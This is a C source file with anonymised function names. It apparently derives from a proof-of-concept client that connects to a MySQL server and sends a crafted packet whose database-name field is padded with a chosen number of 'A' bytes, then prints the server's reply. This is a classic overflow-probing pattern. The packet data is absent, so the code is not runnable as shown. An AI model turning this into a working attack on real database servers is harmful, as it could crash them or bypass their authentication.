#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 char* USOCK ; 
 int* anon_pckt ; 
 int anon_pckt_len ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*,int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 char FUNC3 (int,char**,char*) ; 
 scalar_t__ FUNC4 (char) ; 
 char* optarg ; 
 scalar_t__ opterr ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int FUNC7 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC8 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (int) ; 
 char* FUNC10 (char*) ; 
 int FUNC11 (char*,int) ; 
 int FUNC12 (char*) ; 

int
FUNC13 (int argc, char *argv[])
{
  int fd;
  int i, ret;
  char packet[65535];
  char *path;
  char *host;
  int port = 3306;
  char buf[65535];
  int db_len = 0;
  int pckt_len = anon_pckt_len;
  int unix_sock = 1;
  char c;

  path = FUNC10 (USOCK);
  host = FUNC10 ("127.0.0.1");

  opterr = 0;

  while ((c = FUNC3 (argc, argv, "s:h:p:n:")) != -1)
    switch (c)
      {
      case 's':
	path = FUNC10 (optarg);
	unix_sock = 1;
	break;
      case 'h':
	host = FUNC10 (optarg);
	unix_sock = 0;
	break;
      case 'p':
	port = FUNC0 (optarg);
	unix_sock = 0;
	break;
      case 'n':
	db_len = FUNC0 (optarg);
	break;

      default:
	break;
      }


  FUNC1 (packet, 65535);

  pckt_len = anon_pckt_len + db_len;
  FUNC6 ("%d\n", pckt_len);

  for (i = 0; i < pckt_len; i++)
    packet[i] = anon_pckt[i];

  if (db_len)
    for (i = anon_pckt_len - 2; i < pckt_len; i++)
      packet[i] = 'A';

  packet[pckt_len - 1] = '\0';

  packet[0] = (char) (anon_pckt[0] + db_len) & 0xff;
  packet[1] = (char) ((anon_pckt[0] + db_len) >> 8) & 0xff;
  for (i = 0; i < pckt_len; i++)
    FUNC6 (" %.2x%c", (unsigned char) packet[i],
	    ((i + 1) % 16 ? ' ' : '\n'));
  FUNC6 ("\n");


  if (unix_sock)
    fd = FUNC12 (path);
  else
    fd = FUNC11 (host, port);

  FUNC9 (1);
  ret = FUNC7 (fd, buf, 65535, 0);
  if (FUNC8 (fd, packet, pckt_len, 0) != pckt_len)
    {
      FUNC5 ("cli: send(anon_pckt)");
      FUNC2 (1);
    }

  ret = FUNC7 (fd, buf, 65535, 0);
  for (i = 0; i < ret; i++)
    FUNC6 ("%c", (FUNC4 (buf[i]) ? buf[i] : '.'));
  FUNC6 ("\n");
  return 0;
}